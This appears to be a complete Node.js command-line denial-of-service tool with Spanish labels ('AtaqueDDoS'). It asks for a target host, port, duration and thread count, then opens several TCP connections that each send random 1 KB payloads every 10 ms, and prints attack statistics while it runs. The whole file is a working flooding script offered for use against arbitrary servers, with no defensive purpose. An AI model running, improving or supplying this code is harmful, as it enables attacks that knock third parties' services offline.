#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const http = require('http');
const https = require('https');
const os = require('os');
const dns = require('dns').promises;

class AtaqueDDoS {
    constructor() {
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        this.estadisticas = {
            paquetes: 0,
            exitosos: 0,
            fallidos: 0,
            inicio: Date.now(),
            metodos: new Set()
        };
        this.trabajadores = [];
    }

    async entrada(mensaje) {
        return new Promise(resolve => {
            this.rl.question(`\x1b[1;32m${mensaje}\x1b[0m`, resolve);
        });
    }

    async entradaNumero(mensaje, min, max) {
        while (true) {
            const input = await this.entrada(mensaje);
            const num = parseInt(input);
            if (!isNaN(num) && num >= min && num <= max) return num;
            console.log('\x1b[1;31mEntrada inválida. Intente nuevamente.\x1b[0m');
        }
    }

    async resolverDNS(objetivo) {
        try {
            if (!net.isIP(objetivo)) {
                const registros = await dns.resolve4(objetivo);
                console.log(`\x1b[1;36mDNS resuelto: ${registros[0]}\x1b[0m`);
                return registros[0];
            }
            return objetivo;
        } catch (err) {
            console.log('\x1b[1;33mFallo en resolución DNS, usando como IP\x1b1b[0m');
            return objetivo;
        }
    }

    crearTrabajadorTCP(objetivo, puerto) {
        return () => {
            const socket = net.connect(puerto, objetivo, () => {
                const payload = crypto.randomBytes(1024);
                const intervalo = setInterval(() => {
                    try {
                        socket.write(payload);
                        this.estadisticas.paquetes++;
                        this.estadisticas.exitosos++;
                        this.estadisticas.metodos.add('TCP');
                    } catch {
                        this.estadisticas.fallidos++;
                    }
                }, 10);

                socket.on('error', () => {
                    clearInterval(intervalo);
                    this.estadisticas.fallidos++;
                });
            });
            return socket;
        };
    }

    async iniciar() {
        console.log('\x1b[1;36m=== Configuración de Ataque ===\x1b[0m');

        const objetivo = await this.entrada('Objetivo (IP/Dominio): ');
        this.objetivo = await this.resolverDNS(objetivo);
        this.puerto = await this.entradaNumero('Puerto (1-65535): ', 1, 65535);
        this.duracion = await this.entradaNumero('Duración (segundos): ', 10, 3600);
        this.hilos = await this.entradaNumero('Número de hilos: ', 1, os.cpus().length * 2);

        console.log('\n\x1b[1;36m=== Resumen ===\x1b[0m');
        console.log(`Objetivo: ${this.objetivo}`);
        console.log(`Puerto: ${this.puerto}`);
        console.log(`Duración: ${this.duracion}s`);
        console.log(`Hilos: ${this.hilos}`);

        const confirmar = await this.entrada('\n¿Iniciar ataque? (s/n): ');
        if (confirmar.toLowerCase() !== 's') {
            console.log('\x1b[1;33mAtaque cancelado\x1b[0m');
            process.exit(0);
        }

        await this.ejecutarAtaque();
    }

    async ejecutarAtaque() {
        console.log('\n\x1b[1;31mIniciando ataque...\x1b[0m');


        for (let i = 0; i < this.hilos; i++) {
            this.trabajadores.push(this.crearTrabajadorTCP(this.objetivo, this.puerto)());
        }


        const intervaloStats = setInterval(() => {
            const tiempoTranscurrido = Math.floor((Date.now() - this.estadisticas.inicio) / 1000);
            console.log('\n\x1b[1;35m=== Estadísticas ===\x1b[0m');
            console.log(`Tiempo: ${tiempoTranscurrido}s`);
            console.log(`Paquetes: ${this.estadisticas.paquetes}`);
            console.log(`Exitosos: ${this.estadisticas.exitosos}`);
            console.log(`Fallidos: ${this.estadisticas.fallidos}`);
            console.log(`Métodos: ${Array.from(this.estadisticas.metodos).join(', ')}`);
        }, 5000);


        setTimeout(() => {
            clearInterval(intervaloStats);
            this.detenerAtaque();
            console.log('\n\x1b[1;32mAtaque completado\x1b[0m');
            process.exit(0);
        }, this.duracion * 1000);
    }

    detenerAtaque() {
        this.trabajadores.forEach(trabajador => {
            if (trabajador.destroy) trabajador.destroy();
            if (trabajador.close) trabajador.close();
        });
    }
}


process.on('SIGINT', () => {
    console.log('\n\x1b[1;33mAtaque detenido manualmente\x1b[0m');
    process.exit(0);
});


new AtaqueDDoS().iniciar().catch(err => {
    console.error('\x1b[1;31mError:', err.message, '\x1b[0m');
    process.exit(1);
});